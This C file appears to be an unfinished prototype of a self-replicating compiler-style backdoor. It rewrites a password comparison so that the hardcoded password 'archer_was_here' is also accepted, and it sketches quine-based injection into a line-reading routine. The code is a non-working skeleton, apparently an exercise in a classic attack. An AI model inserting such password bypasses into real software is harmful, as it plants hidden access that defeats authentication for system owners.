#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
9: Tab
34: Quote
92: Backslash
*/
// TODO: Turn this into a quine
int main() {
    char* line = "";
    int i = 0;
    char** lines = NULL;
    
    char* inj_point = "  int num_lines = read_lines_to_array(fp, &lines);\n";
    char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
    char* after = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
    if (strcmp(line, before) == 0) { // Replacement
        line = after;
    }
    if (i>=2 && strcmp(lines[i-2], inj_point) == 0) { // Injection
    //     char* _s = "";
    //     fwrite(s, strlen(s), 1, out);
    }

    char* f = "char* inj_point = %c  int num_lines = read_lines_to_array(fp, &lines);%cn%c;   char* before = %c%c(strcmp(passwords[user_index], password) == 0) {%cn%c    ;   char* after = %c%cif (strcmp(passwords[user_index], password) == 0 || strcmp(%c%carcher_was_here%c%c, password) == 0) {%cn%c    ;    char* f = %c%s%c   ;     if (strcmp(line, before) == 0) {line=after;};  if (i >= 2 && strcmp(lines[i-2], inj_point) == 0) {}   ; printf(f, 34, 92, 34, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34);";
    printf(f, 34, 92, 34, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34);
}